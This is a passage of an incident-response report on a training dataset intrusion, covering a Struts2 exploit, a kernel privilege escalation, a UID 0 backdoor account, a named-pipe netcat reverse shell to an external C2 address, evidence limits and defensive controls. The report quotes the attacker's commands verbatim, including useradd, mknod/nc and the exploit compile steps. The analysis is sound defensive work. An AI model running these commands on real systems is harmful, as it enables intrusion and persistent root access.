the masqueraded HTTP client `iexeplorer.exe`, located at
`C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe`, MD5 `655D76930C77B713864CD26E386F1DE7`. Despite
the name, this is not Internet Explorer; it is a custom HTTP client whose command line takes a target
URL and a shell command as arguments. Its parent process is **session C442**, the elevated task
agent produced by the UAC bypass (§4.3), not the original base-implant stager. A full-day scan of
every `iexeplorer.exe` invocation on this host confirms C442 and, later, its second-instance
counterpart D8AE (§4.7, §7.8) are the *only* two parents this process ever has.

That lineage settles a question that would otherwise remain open. The operator's console never
moved: every command executed on hoth was issued from FYODOR-L, through the Empire implant, out
through interface B. hoth is a target throughout, not a second operating position.

`stream:http` captures the request bodies in `form_data`, showing a standard
CVE-2017-5638 Jakarta Multipart parser `Content-Type` injection. The OGNL payload branches on
operating system and, on the non-Windows branch, invokes `ProcessBuilder` with `/bin/bash -c` to
execute the attacker-supplied command, with `redirectErrorStream(true)` set. That last detail is not
decoration: it merges stderr into the HTTP response body, and it is the mechanism that makes response
*length* informative about command failure in §7.3.

The user agent, `python-requests/2.18.4`, is an automated tool, consistent with a generalised
CVE-2017-5638 exploitation script rather than manual request crafting.

**ATT&CK: T1210 (Exploitation of Remote Services)** — explicitly **not** T1190. T1190 requires an
Internet-facing target; `192.168.9.30` is an internal address reached from an internal interface of
an already-compromised host. This is lateral movement by exploitation, and mapping it to T1190 would
misrepresent both the attack surface and the control that failed.

### 7.3 First backdoor account attempt — failure under an unprivileged context

```
11:07:03  FYODOR-L (Sysmon EventID 1 / Security 4688) — iexeplorer.exe issues:
          useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com
11:07:04  hoth (stream:http)  — POST saveGangster.action, status 200, content_length 79
```

`useradd -ou 0 -g 0` asks for UID 0, a second root account. That requires root privilege to run, and
§7.1 already established the execution context as `tomcat8`, `euid=111`. My first reaction was that
this should just fail on privilege arithmetic alone. But an unprivileged account trying something and
an unprivileged account succeeding at it are different claims, and the only thing I actually have
here is a 200 status code with a 79-byte body. Neither of those tells me success or failure by
itself; HTTP 200 in an OGNL RCE just means the injected expression evaluated, and a body of some
length is what I'd get from either outcome. So I couldn't answer "did it work" directly. What I could
do was look at what else the data would tell me.

I checked three things, in the order they'd actually settle it for me.

First: does the response length match a specific failure mode, or is 79 bytes just noise? A privilege
failure in `useradd` writes a fixed two-line message to stderr, and `redirectErrorStream(true)` would
fold that into the HTTP response body. 79 bytes is consistent with that message. It is not consistent
with silence, which is what a successful `useradd` produces (Linux `useradd` has no stdout on
success). That didn't confirm failure on its own for me. `response_body` isn't captured by
`stream:http` in this dataset (§8.1), so this is a length inference, not a read of the actual text.
But it pointed the same direction as the privilege argument, not the opposite one, so I kept it and
moved on.

Second, and this is the one that actually convinced me: if the account had really been created with
UID 0, what would the operator do next? Check it. `id tomcat7`, `getent passwd tomcat7`, something.
That's the obvious next move for anyone who just tried to get root and isn't sure it landed. I looked
for that and it's not in the data. What is in the data, starting 24 seconds later, is `uname -a`
(11:07:28) and `lsb_release -a` (11:07:47): kernel and distribution fingerprinting. I read that as an
odd thing to do immediately after supposedly becoming root, unless you don't yet have root and are
now gathering what you need for a different path to it. Within 94 seconds of the failed useradd, the
operator begins staging a kernel exploit (11:08:37, §7.4). To me, kernel fingerprinting followed by a
kernel exploit reads as the behaviour of someone whose privilege escalation attempt just failed, not
someone celebrating a UID 0 account.

So I have two independent signals, response length and behavioural sequence, pointing the same way,
on top of the privilege arithmetic that made failure likely in the first place. None of the three is
individually conclusive on its own. Together, I think they're enough to call this failed rather than
merely undetermined.

At this point I ran into a complication I had to deal with before the failure conclusion could stand:
a `tomcat7` account with UID 0 already existed on hoth before this attack chain began. The first
`Unix:UserAccounts` snapshot of the day (09:35:46) shows 35 accounts and no `tomcat7`; the 10:24:58
snapshot shows 36 accounts including `tomcat7`; and the only `useradd` `new user` syslog record
anywhere in the dataset is at 11:24:44, after both attempts described here. So the account was
created sometime between 09:35 and 10:24, by something other than `useradd` (most plausibly a direct
write to `/etc/passwd`, which leaves no syslog trace), before the Struts2 chain even started.

That changes what "failed" means here. If `tomcat7` already existed when the 11:07 command ran,
`useradd` would refuse for a second, independent reason: the name is taken. I can't pick between the
unprivileged-context explanation and the name-collision explanation from this data; both are live.
What I can say is that the operator's 11:07 and 11:24 commands are best read as attempts to
(re)create an account that, unknown to them, already existed. I'm not chasing the origin of that
earlier account here; it's identified and Parked (§8.4). I'm raising it at all only because leaving
it out would make the causal story of why the first attempt failed look more settled than it
actually is.

One more thing worth checking: could I confirm the pre-existing `tomcat7` directly, instead of
inferring it from snapshot timing? The `cat /etc/passwd` response at 11:06:39 (content_length 1796)
is the only capture of that file anywhere in this dataset, and it does show `tomcat7`, but the
capture happens after the account was created, so it can't distinguish "already there" from "just
created." A length-differential test against a pre-attack baseline would settle it, if one existed.
None does. That's a structural limit of the dataset, not a search I got wrong, and I'm noting it so I
don't retry the same query later expecting a different answer.

**Assessment: Confirmed** (first attempt failed) · **Confirmed** (account pre-existed) · **Parked**
(creator and method of the pre-existing account, §8.4).

### 7.4 Privilege escalation: eBPF kernel privilege escalation (CVE-2017-16995)

Having failed to obtain root through the account route, the operator solved the privilege problem
directly. The full chain is recoverable second by second from `stream:http`, osquery FIM, osquery
process monitoring and a `top` snapshot.

```
11:08:37  stream:http, content_length 0
          echo <base64 of colonel.c> >> /tmp/colonel
11:09:07  osquery FIM  — /tmp/colonel CREATED+UPDATED, size 7701,
                          md5 ed52a04285a94f503d3fa37d0243d06b, uid 111
11:10:56  stream:http  — base64 --decode /tmp/colonel > /tmp/colonel.c   (silent, length 0)
11:11:04  osquery proc — base64 --decode /tmp/colonel, euid 111
11:11:27  stream:http  — cat /tmp/colonel.c        (content_length 5775 — operator self-verifies)
11:11:47  stream:http  — md5sum /tmp/colonel.c     (content_length 49 — operator self-verifies)
11:13:57  osquery FIM  — /tmp/colonel.c CREATED+UPDATED, size 5775,
                          md5 a38e52b80028516698c966acab2f4bef
11:15:01  osquery proc — gcc colonel.c -o colonelnew  (gcc-5 → cc1 → collect2 → ld), all euid 111
11:16:48  osquery proc — chmod +x colonelnew, euid 111
11:16:58  osquery proc — ./colonelnew executed, PID 9456, euid 111
```

The source is identified from its own contents: the decoded file is a CVE-2017-16995 exploit whose
comments describe it as an Ubuntu 16.04.4 kernel privilege escalation, **tested on
`4.4.0-116-generic`**. hoth runs Ubuntu 16.04.4 on kernel `4.4.0-116-generic`. I didn't need to infer
this match from behaviour; it's an exact textual match between the exploit's own stated target and
the victim kernel. It's also consistent with the `uname -a` / `lsb_release -a` fingerprinting the
operator ran minutes earlier (§7.3): the exploit selected was the one that matched what had already
been fingerprinted.

I wanted a second, independent confirmation of the same match rather than relying on the source
comments alone, so I went back to the response-length method from §7.1. The `uname -a` response at
11:07:28 is exactly 105 bytes, matching
`Linux hoth 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64
GNU/Linux\n` byte-for-byte, the same kernel banner named in `colonel.c`'s own comments. So the kernel
match is established twice, by two independent methods: the exploit's stated target (textual, from
the source) and the live host's own `uname` output (length-reconstructed, from `stream:http`). The
`lsb_release -a` response (117 bytes, 11:07:46) is consistent with, though not an exact-length match
to, standard Ubuntu 16.04.4 LTS ("xenial") output, so I'm treating that one as supporting rather than
exact corroboration.

The technique itself abuses `BPF_PROG_LOAD` verifier flaws to obtain arbitrary kernel memory
read/write, locates the calling process's `task_struct`, overwrites the credential structure to set
uid/gid to 0, and, if `getuid()` then returns 0, spawns `/bin/bash`.

Two operator behaviours in this sequence are worth noting because they are detection-relevant. The
operator verified their own staging (`cat`, then `md5sum`) before compiling; base64 transfer
through an HTTP injection channel is lossy enough to be worth checking. And the exploit was
compiled on the victim, because a web application server had a complete GCC toolchain available
to an unprivileged service account.

### 7.5 Proof that escalation succeeded

The staging chain above proves an exploit was built and run. It does not prove it worked. That proof
comes from the process tree.

```
11:16:58  osquery proc — sh -c /bin/bash, PID 9457, uid 0
11:16:58  osquery proc — /bin/bash,       PID 9458, uid 0, euid 0
11:16:54  top snapshot — process tree:
            9456 tomcat8  colonelnew
              └ 9457 root  sh
                  └ 9458 root  bash
```

`colonelnew` runs as `tomcat8`; its direct child chain runs as root. That is the textbook
signature of a successful kernel privilege escalation, and it corresponds exactly to the exploit's
own logic: spawn a shell only after confirming `getuid() == 0`. The evidence is doubled: osquery
process events and the independent `top` snapshot show the same tree.

**Assessment: High confidence — escalation succeeded.**

PID 9457 is recorded with `uid=0` but `euid=111`, a mid-state consistent with
a kernel-level exploit rewriting the credential structure directly, unlike a `sudo`/setuid escalation
where uid and euid change together. That reading is based on a single osquery sample and is not
load-bearing. The escalation conclusion rests on PID 9458 (`uid=euid=0`) and the `top` process
tree, both of which are unambiguous without it.

*A second boundary statement.* PIDs are recycled by the Linux kernel. The same PID numbers appear
later in the day belonging to Splunk forwarder `top.sh` processes and are entirely unrelated. No
link in this section is made on PID number alone; each link is made on parent-child relationships
captured within the same snapshot.

**ATT&CK:** T1068 (Exploitation for Privilege Escalation) · T1105 (Ingress Tool Transfer) ·
T1140 (Deobfuscate/Decode Files or Information) · T1027 (Obfuscated Files or Information).

### 7.6 Root-context reconnaissance

```
11:21:56  osquery proc — locate suitecrm  /  locate mysql, euid 0
```

Five minutes after obtaining root, the operator located the SuiteCRM installation and the MySQL
data. This is the first action in the intrusion aimed at **data** rather than at access, and it
identifies what the operator was actually after: the customer relationship management system and its
database.

These commands are attacker activity, not collection noise. The discriminators: `euid=0` in a
context immediately following a known escalation; the `mlocate` binary's `atime` values sit adjacent
to the observed invocation, whereas Splunk forwarder telemetry-collection noise carries a fixed,
much earlier `atime`; and the binary path contains no `Splunk_ta_nix` component.

**Assessment: Confirmed.**
**ATT&CK:** T1083 (File and Directory Discovery) · T1082 (System Information Discovery).

### 7.7 Second backdoor account attempt — success under root

```
11:24:44  hoth syslog  — useradd[12815]: new user: name=tomcat7, UID=0, GID=0,
                          home=/home/tomcat7, shell=/bin/bash
11:24:54  hoth osquery — useradd process, decorations.username=root, euid 0, gid 0
```

The syslog `new user` record is the authoritative system-level confirmation of account creation, and
it reports exactly what the operator wanted: a second UID 0 account.

One detail confirms this was a deliberate, reasoned retry rather than an automated replay: the
password argument changed between attempts, from `davidverve.com` at 11:07 to `ilovedavidverve` at
11:24. A replayed command is byte-identical; a human retrying after solving a blocking problem
changes things.

The complete causal sequence for this phase is therefore:

> **attempt → fail (unprivileged) → stage kernel exploit → compile → execute → root → recon →
> retry → succeed**

Each arrow in that chain is independently evidenced, and the chain is the reason this phase reads as
an operator's reasoning process rather than as a list of observed commands.

**Assessment: Confirmed.**
**ATT&CK:** T1136.001 (Create Account: Local Account) — a UID 0 account is simultaneously
persistence and a privilege guarantee, which is why no separate Linux persistence mechanism was
strictly necessary.

### 7.8 Reverse shell to the unified C2 infrastructure — constructed through the same RCE channel

Two reverse-shell sessions ran from hoth to `45.77.53.176:8088` — **the unified C2 infrastructure**
of §5.3 — beginning at **11:13:56** and **11:34:00**. Both were built through the same
CVE-2017-5638 OGNL injection channel used for every other command in this phase; the operator did
not pivot away from HTTP to establish them.

Construction sequence, verbatim from `stream:http` `form_data`, both sessions:

```
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe
```

`mknod /tmp/backpipe p` creates a named pipe; the second command reads a shell's input from that
pipe and writes its output through `nc` to the C2 address, the standard named-pipe reverse shell
construction. This sequence appears twice, at 11:12:51 / 11:13:56 and again at 11:33:45 /
11:34:00, each pair coincident with the corresponding session's establishment: the `nc` invocation
and the observed session both fall within the same one-second window. The second pair is issued by
session D8AE (§4.3, §4.7), the elevated task agent produced by the operator's second UAC-bypass
sequence at 11:32:12; D8AE's beaconing stops in the same second the shell is established, mirroring
the first agent's behaviour exactly.

An earlier reading of this phase assessed (Medium confidence) that once the
first reverse shell opened, the operator no longer needed the HTTP injection channel and shifted to
issuing commands interactively, inferred from an apparent thinning of `stream:http` traffic after
11:13. That assessment is withdrawn, not merely downgraded. The construction commands above are
themselves HTTP-injected payloads; the channel was not abandoned, it built the shell. The correct
reading is simpler: the HTTP injection channel remained the operator's command-and-control path
throughout Phase 3, and the reverse shell is best understood as an additional interactive channel
built through it, not a replacement for it.

The `top` snapshot independently shows an `nc` (netcat) process, PID 8608, running
as `tomcat8`, with the lineage `bash (8605) → sh (8607) → nc (8608)` — process-level confirmation of
the same tool named in the injected command.

Traffic direction is the finding here, not traffic volume. `stream:tcp` shows approximately 1.1 MB
inbound (C2 to hoth) against roughly 40 KB outbound. A volume-only reading would flag 1.1 MB as
data exfiltration and be wrong by 180 degrees: the large flow is into the victim, which is
consistent with tooling and payload delivery, and the small outbound flow is consistent with
interactive command output. There is no evidence of bulk data egress from hoth in this dataset.

`colonelnew` was executed a second time at 11:34:49 (PID 17283), 48 seconds after the
second `mknod`/`nc` pair completes (11:34:01). The relationship is temporally tight but not causally
proven; a plausible reading is that the second reverse-shell session began in an
unprivileged context and required re-escalation before further action. This remains Parked, not
Confirmed: no direct evidence (e.g. a command issued from within the second shell session showing
a non-root uid) ties the two events causally, only their sequence. See §8.

**Assessment: Confirmed** (both sessions, construction mechanism, tool, direction) · **Parked**
(second `colonelnew` execution — temporally adjacent to the second session, causally unconfirmed).

**ATT&CK:** T1059.004 (Unix Shell) · T1071.001 (Application Layer Protocol) · T1105 (Ingress Tool
Transfer) · T1140 (Deobfuscate/Decode Files or Information — the same channel used for `colonel.c`).

### 7.9 Phase 3 in summary

Within 28 minutes of the first exploit request, the operator moved from an unauthenticated HTTP
request against a Java application to a root shell, a UID 0 backdoor account, an interactive C2
channel, and reconnaissance aimed at the CRM database. Nothing in that sequence required a zero-day,
a stolen credential, or a novel technique. It required a public exploit for an unpatched
application, a public exploit for an unpatched kernel, a compiler on a production server, and no
segmentation between the user and server networks.

The detection opportunities that this chain exposes — a web service account spawning `gcc`, a
write-decode-compile-execute sequence in `/tmp`, and a child process whose uid jumps to 0 — are
analysed in the detection pack, within the scope boundary stated in §1.4.

---

## §8 Evidence Coverage Boundaries & Unresolved Questions

> **In one line:** what this report can't answer, and why, stated up front rather than left for a
> reader to discover.

§§1–7 state what this investigation proved. This section states the shape of what it could
not prove, and why. The distinction it enforces throughout is between three different things that a
weak report collapses into one:

- **a boundary** — the source that would answer the question does not cover the question;
- **a true negative** — the source covers the question, was interrogated, and returned nothing;
- **a parked lead** — the source exists and the question is answerable, but the work was not done
  this cycle and is explicitly deferred.

Only the second of those licenses a negative finding. Reporting a boundary as a negative finding is
the most common way an incident report overstates its own completeness.

### 8.1 What each source can and cannot prove

| Source | Establishes | Does **not** establish | Consequence in this report |
|--------|-------------|------------------------|----------------------------|
| `stream:http` | Request bodies (`form_data`), URI paths, method, status, `http_content_length` | **`response_body` is not captured.** Response *length* is available; response *content* is not | The 11:07 `useradd` failure is supported by a 79-byte length reconstruction, never by reading the error text (§7.3) |
| `stream:tcp` | Session existence, endpoints, byte volume, direction, timing | No payload, no content | The direction of the reverse-shell transfer is analysable; the **content** of the ~1.1 MB inbound flow is not (§7.8, §8.4 #12) |
| Sysmon EventID 3 | Connection **attempts** at the process layer, with `Image`, `User`, `ProcessGuid` | Whether the connection completed | Counts diverge from `stream:tcp` for the same activity; neither corrects the other (§5.4) |
| Sysmon EventID 1 / Security 4688 | Process creation with full command line and parent lineage | Whether the process achieved its objective | `process created ≠ privilege changed`; escalation is proven only by a child process's uid (§7.5) |
| osquery `pack_process-monitoring` | `uid`/`euid`/`gid`, `cmdline`, PID, parent, per-process | Precise ordering — a collection batch shares one `_time`, and captured `argv` order does not reflect shell command order | Sub-second sequencing is arbitrated by `stream:http` and Sysmon, never by osquery batch `_time` (§1.3) |
| osquery `pack_fim_file_events` | File create/modify with size and MD5 | The exact instant of the write. The FIM record for `/tmp/colonel.c` lands at **11:13:57**, although the file's decoded content was already read back by the operator at **11:11:27** (§7.4) | FIM timestamps are treated as **collection-time upper bounds**, not creation instants. No causal ordering in §7.4 rests on a FIM timestamp |
| `Unix:UserAccounts` | Point-in-time account inventory | Anything between snapshots. Snapshots on this host land at 09:35:46, 10:24:58, 11:48:24, 13:33:35, 14:33:35 | The pre-existing `tomcat7` (UID 0) can only be bounded to the 09:35–10:24 window; no finer resolution is available from this source (§7.3) |
| `syslog` | Authoritative record of `useradd`-family account creation | Account creation by **any other method**. A direct write to `/etc/passwd` produces no syslog record at all | The single `new user` line at 11:24:44 is authoritative for the second attempt, and its *absence* earlier is what proves the first `tomcat7` was not created with `useradd` (§7.3) |
| `bash_history` (hoth) | Interactive shell commands | Non-interactive commands executed through an RCE channel — but see §8.2, this source's behaviour in this incident is better than that generic caveat suggests | Treated as a **true negative**, not a boundary (§8.2) |
| O365 management activity | Tenant-side file, sharing and sign-in operations with client IP | Endpoint-side outcome of any of them | `AnonymousLinkUsed` proves a link was fetched; only endpoint telemetry proves what happened next (§3.2, §3.3) |

### 8.2 Two negative findings, only one of which is clean

I found two zero-result searches in this investigation. My first instinct was to write both up as
"no evidence found", but they're not the same kind of zero, and treating them the same would have
been a mistake.

**`bash_history` on hoth: a true negative, and a load-bearing one.** The sourcetype exists for this
host and carries **83 records spanning 11:06:55–13:33:30**, which fully brackets the Phase 3 attack
window (11:07–11:34). I reviewed every record. None of the attacker's commands appear: no `useradd`,
no `mknod`, no `nc … 8088`, no `gcc colonel.c`, no `locate suitecrm`. What the 83 records do contain
is three discontinuous clusters of ordinary administrative work: `vi inputs.conf`, repeated `cd` into
and out of `Splunk_ta_nix/local/system`, and `/opt/splunkforwarder/bin/splunk restart`, an
administrator configuring a Splunk forwarder, unrelated to this intrusion.

That result is worth more than it looks like at first. The presence of the ops session proves the
source writes records when an interactive login happens on this host, so the attacker never had one:
every command in Phase 3 was injected through the Struts2 OGNL RCE channel and executed
non-interactively. This is what let me upgrade the behavioural argument in §7.3 from "one source is
silent" to "two sources are silent, and I've confirmed both had coverage", which is a genuinely
stronger claim, and it's why I'm putting `bash_history` here rather than in the boundary table above.

**`svcvnc` logon activity: an un-adjudicated zero, carried as Parked.** A search for logon events
corresponding to the `svcvnc` backdoor account (§4.4) also returned no results, and my first reaction
was to treat it the same way. It isn't the same. This zero can't be promoted to a finding, because
the analytic returned zero across the entire environment, for every account, including accounts I
know were used. A source that returns zero universally hasn't told me anything about `svcvnc`
specifically; it's told me something about the source itself. So whether `svcvnc` was ever used to
authenticate stays **Parked** (§8.4 #3). I'm not writing "the account was never used" anywhere in this
report, because that's not what a broken analytic tells you.

**Assessment:** `bash_history` coverage — **Confirmed**; attacker absence from it — **Confirmed**.
`svcvnc` subsequent use — **Parked**.

### 8.3 Genuine coverage boundaries

1. **HTTP response content.** `stream:http` captures request bodies but not response bodies. Every
   inference about a command's *output* in Phase 3 is a length reconstruction. Where this matters —
   the 79-byte `useradd` failure — the report says so in the same paragraph as the claim (§7.3).

2. **The other five discovered hosts.** The hdoor sweep found six live hosts (§6.1); only `hoth` is
   covered end-to-end by `stream:http`, `stream:tcp` and osquery. `192.168.9.31` in particular
   presented an SMB-characteristic profile, and SMB-layer activity against it falls outside the
   coverage of the network sources available here. **Exploitation of `.31` is not excludable**, and
   the report does not claim two hosts were compromised out of six on the strength of an absence —
   it claims two hosts on the strength of positive evidence on exactly two (§0, §3.3).

3. **No baseline for false-positive rates.** BOTSv3 is an event-capture dataset assembled around an
   incident, not a steady-state operational capture. Using it as its own anomaly baseline for events
   inside the same capture is circular. **No false-positive rate is claimed anywhere in the detection pack**, and
   where a detection would ordinarily carry FP tuning numbers, the limitation is stated instead of
   filled in. This applies with particular force to DO-3.3, where the relevant analytic returns zero
   environment-wide (§8.2) and an in-dataset FP assessment would be meaningless (see detection pack).

4. **Linux persistence beyond the UID 0 account.** `crontab`, `authorized_keys`, systemd units and
   `/etc/rc.local` on hoth were not enumerated. The `tomcat7` (UID 0) backdoor account is itself
   persistence and is Confirmed (§7.7), but the report does not assert it was the *only* persistence
   mechanism established on hoth. That is an open question, not a negative finding (§8.4 #8).

5. **The 09:35–10:24 window on hoth.** Closing the origin of the pre-existing `tomcat7` requires
   sources not interrogated in this cycle — FIM on `/etc/passwd`, `access_combined`, and `sshd`
   authentication logs for that window. This is deferred to the supplement by deliberate scope
   choice (§8.4 #6), not because the data is absent.

### 8.4 Parked leads register

Every lead below was identified from evidence during this investigation, assessed as not required
for the conclusions in §0, and explicitly deferred. Each carries the analytic that would close it,
so that the register is actionable rather than decorative.

| # | Lead | What is established | What would close it | Priority |
|---|------|---------------------|---------------------|----------|
| 1 | Origin of the `bgist` credentials | The account was compromised via credential theft, evidenced by impossible travel and a targeted single-account sign-in (§3.1). How the credentials were obtained is one step earlier in the chain and is not evidenced here | Sign-in and mail telemetry for `bgist` in the days preceding 2018-08-20; any prior phishing or credential-harvesting event in the tenant | Medium |
| 2 | The seven `AnonymousLinkUsed` accesses | At least seven distinct external IPs fetched the shared file between 09:59:04 and 10:01:13 (§3.1) | Attribution of each IP to a recipient, a security gateway pre-fetching the URL, or the operator verifying the link. The endpoint-side evidence for the one access that mattered stands independently of this | Low |
| 3 | Subsequent use of `svcvnc` | Creation is Confirmed three-source (§4.4). The corresponding logon analytic returns zero environment-wide, which is a source question, not an account finding (§8.2) | An authentication source with demonstrated coverage of interactive and network logons on FYODOR-L | Medium |
| 4 | **Trigger mechanism for the resident SYSTEM implant C637** | At 10:15:27 an Empire stager launched with `WmiPrvSE.exe` as parent, under SYSTEM (§4.5, §4.7). It is **not** a WMI event-subscription — Sysmon EventID 19/20/21 are absent from the entire window. It is **not** a continuation of the 10:11:00 registry-resident loader execution — the `ProcessGuid`/`ParentProcessGuid` lineages are disjoint. The parent `WmiPrvSE.exe` instance has no process-creation event in this host's telemetry and therefore predates the search window | WMI-Activity operational logs, or Sysmon coverage extended earlier than the current window. Note that **attribution is already Confirmed independently** (shared staging key, shared destination, 104-minute session duration); only the mechanism is open | Medium |
| 5 | Second execution of `colonelnew` | Executed again at 11:34:49 (PID 17283), 48 seconds after the second reverse-shell construction completed (§7.8). Temporally tight; causally unproven | A command issued from within the second shell session showing a non-root uid, which would confirm the re-escalation reading | Low |
| 6 | **Creator and method of the pre-existing `tomcat7`** | A `tomcat7` (UID 0) account existed on hoth before the Struts2 chain began, created between 09:35 and 10:24 by a method that invokes no `useradd` (§7.3) | FIM on `/etc/passwd` for that window, `access_combined`, `sshd` authentication logs, process monitoring before 11:00. **Handled in a separate supplement** — it is plausibly an independent, earlier intrusion and forcing it into this narrative would misrepresent both | Medium (deferred by design) |
| 7 | Disappearance of `tomcat7` | Present in the 11:48:24 snapshot, absent from the 13:33:35 snapshot (account count returns 36 → 35). Something removed it that afternoon | `syslog` `userdel` records and process monitoring for 11:48–13:33. Distinguishing incident-response remediation from attacker OPSEC is the question | Low |
| 8 | Linux persistence on hoth beyond the UID 0 account | Not enumerated (§8.3 #4) | `crontab`, `authorized_keys`, systemd unit and `/etc/rc.local` state, compared against a pre-incident reference | Medium |
| 9 | Whether hoth was used as an onward pivot | Not investigated after the reverse shell was established | Outbound `stream:http`/`stream:tcp` from `192.168.9.30` to other internal hosts after 11:16 | Medium |
| 10 | Identity of `192.168.8.111` | Appeared during the investigation without a role in the confirmed chain | Asset inventory and DHCP/DNS correlation | Low |
| 11 | The `ubuntu@…compute.amazonaws.com` recipient | An external credential-relevant surface observed in the environment, not connected to the confirmed chain | Correspondence and cloud-account review | Medium |
| 12 | Content of the ~1.1 MB inbound reverse-shell transfer | Direction and volume are Confirmed (§7.8); `stream:tcp` carries no payload (§8.1) | Host-side artefacts on hoth — new files under `/tmp` or the `tomcat8` home directory in the 11:13–11:35 window, which FIM may partially cover | Medium |
| 13 | **Purpose of the single port-3333 connection** | Session C442 made exactly one connection to `45.77.53.176:3333` at 10:47:06, 37 seconds after the firewall was disabled (§4.6). A single record cannot establish whether the connection succeeded or what it carried | A capture with payload visibility on port 3333, or additional connection records if the query window is extended | Medium |
| 14 | **Motive for disabling the Windows Firewall** | `netsh advfirewall set allprofiles state off` executed at 10:46:29, after the network sweep and before lateral movement (§4.6) | Correlation with the port-3333 connection (#13) or any subsequent inbound connection to FYODOR-L | Low |
| 15 | **Parent lineage of the 11:41:33 reconnaissance burst** | `netstat -nao \| findstr LISTENING` and `wmic os get LocalDateTime` executed under SYSTEM at 11:41:33 (§4.7). The immediate parent `cmd.exe` process's own parent `ProcessGuid` was not confirmed in the queries run to date | A follow-up query tracing the parent chain of the `cmd.exe` instance at 11:41:33; if it resolves to C52C or C637, the "resident implants are otherwise silent" characterisation in §4.7 needs a further amendment alongside the `tar.exe` exception already noted | Medium |
| 16 | **Contents, working directory and destination of `archive.tar`** | `tar.exe -cvzf archive.tar *` executed at 11:52:16 from session C52C (§4.7). This is Confirmed as a collection action; whether it was subsequently transmitted anywhere is not established | Host-side file-creation events for `archive.tar`, and any outbound transfer from FYODOR-L after 11:52:16 | Medium |
| 17 | **Termination mechanism of the three long-running sessions** | C300, C52C and C637 are last observed beaconing at 11:59:33–36, within a Sysmon collection window confirmed to continue to 15:17 (§4.7). The silence is a true negative, not a coverage artefact, but EventID 5 (process termination) carries essentially no coverage on this host — one record in the entire 09:12–15:17 window | A source with meaningful process-termination coverage for this host, or corroborating evidence such as a subsequent host reboot, EDR isolation action, or network block | Low |
| 18 | **The `NaenaraBrowser`/`ko-KP` User-Agent string during lure construction** | From 09:56:38 to 09:57:20, every SharePoint action in the lure-construction sequence carries a `User-Agent` naming North Korea's Red Star OS browser (§3.1). Same account, same IP, same continuous session as the confirmed compromise; a different `User-Agent` value than the sign-in event nine minutes earlier | Cannot be closed by this dataset alone: a client-supplied header cannot distinguish a genuine Red Star OS client from a fabricated string. External threat-intelligence correlation (known infrastructure, known tooling fingerprints) would be needed before this moves past Indicative | Low (attribution-adjacent, not chain-critical) |

### 8.5 The questions this investigation does not answer

Three, stated plainly rather than papered over.

**What, if anything, was taken.** The operator's root-context reconnaissance is aimed unambiguously
at data — `locate suitecrm`, `locate mysql` (§7.6) — and that is the first action in the whole
intrusion directed at information rather than access. On the Windows side, this progressed one step
further: a resident SYSTEM implant on FYODOR-L executed `tar -cvzf archive.tar *` at 11:52:16 (§4.7),
which is Confirmed collection, not merely reconnaissance. What is not evidenced is transmission of
that archive anywhere — no corresponding outbound transfer of matching volume is observed in the
window covered by this report, and the archive's working directory and contents are themselves
unconfirmed (§8.4 #16). On hoth, the single large transfer over the reverse shell runs *into* the
victim, not out of it (§7.8), and no equivalent collection step is evidenced there. The correct
statement is **"reconnaissance for data was Confirmed on both hosts, and a collection action was
Confirmed on FYODOR-L; exfiltration is not evidenced on either host"** — not "no data was taken" and
not "nothing beyond reconnaissance occurred."

**Whether one actor or two were present on hoth.** The main-line intrusion is attributed to a single
actor with Confirmed infrastructure convergence (§5.3). The earlier `tomcat7` backdoor is a separate
question, and the honest answer is that the available evidence does not settle whether the same
operator planted it (§8.4 #6).

**Where the intrusion ended.** The evidence in scope ends at 11:34:49. Containment, eradication and
the attacker's subsequent activity — if any — are outside this analysis. The disappearance of
`tomcat7` later that afternoon (§8.4 #7) is the only downstream signal observed, and it is
unattributed.

---

## §9 Defensive Recommendations

> **In one line:** thirteen controls, each traced back to the specific gap in this report that it
> would have closed.

Each recommendation below traces to a specific section, names the control gap that section exposed,
and states what it would have interrupted. No generic advice appears here; if a recommendation cannot
be tied to observed evidence, it is not in the list. Detection rules referenced by ID (DO-x.x) are
delivered in the companion detection pack.

### 9.1 Structural — these change what the intrusion could have achieved

**1. Segment the user network from the server network.** *(§6.1)* The `hdoor.exe` sweep crossed from
`192.168.8.0/24` into `192.168.9.0/24` and mapped six hosts in 34 seconds because nothing prevented
it. Every subsequent event in this incident (target selection, exploitation, escalation, the second
backdoor account) depended on that traversal. This is the single highest-value control in the
report: it does not merely detect the intrusion, it truncates it at 10:43.

**2. Remove build toolchains from production application servers.** *(§7.4)* hoth carried a complete
GCC toolchain usable by the unprivileged Tomcat 8 service account, and the operator compiled the
kernel exploit on the victim. Removing the toolchain does not make the kernel less vulnerable,
but it forces the operator to cross-compile and transfer a binary, a slower, noisier step with more
detection surface. Where a compiler must remain, it should not be executable by service accounts.

**3. Bring both hosts into patch scope.** *(§7.2, §7.4)* CVE-2017-5638 was public and weaponised
seventeen months before this incident; kernel `4.4.0-116-generic` was vulnerable to a public exploit
whose source comments name that exact kernel version. Neither required attacker sophistication;
they required an unpatched application framework and an unpatched kernel on the same host. An asset
inventory that includes application-framework versions, not only OS packages, is the prerequisite.

**4. Remove standing local administrator rights from interactive user accounts.** *(§4.3)* The
`fodhelper.exe` UAC bypass needed no exploit and no credential, only local Administrators
membership, which the interactive user held. Without it, the escalation at 10:07:05 does not occur,
and the account creation seventy-two seconds later becomes impossible. Detection (DO-2.1) is worth
deploying, but it is a second line behind this control, not a substitute for it.

**5. Apply an egress policy to the server segment.** *(§7.8)* hoth initiated an outbound session to
an external address on port 8088. An application server has no business establishing arbitrary
outbound connections; a default-deny egress policy with an explicit allow-list turns the reverse
shell from a detection problem into a blocked connection. The same policy denies the ~1.1 MB inbound
tool transfer.

### 9.2 Control and configuration

**6. Stop treating "internal host to external 443" as inherently benign.** *(§5.2)* The C2 beacon
shared egress interface, destination port and encrypted transport with legitimate Microsoft cloud
traffic. Any control keyed on that tuple is blind to it, and no tuning on that axis recovers it. The
replacement is behavioural: interval regularity, originating process image, and process lineage,
implemented as DO-2.2, a direct consequence of this section rather than a generic recommendation.

**7. Govern anonymous external sharing in the O365 tenant.** *(§3.1)* Delivery worked because an
anonymous link from a legitimate internal account inside the organisation's own tenant defeats
sender reputation, attachment sandboxing and external-domain controls simultaneously; at the moment
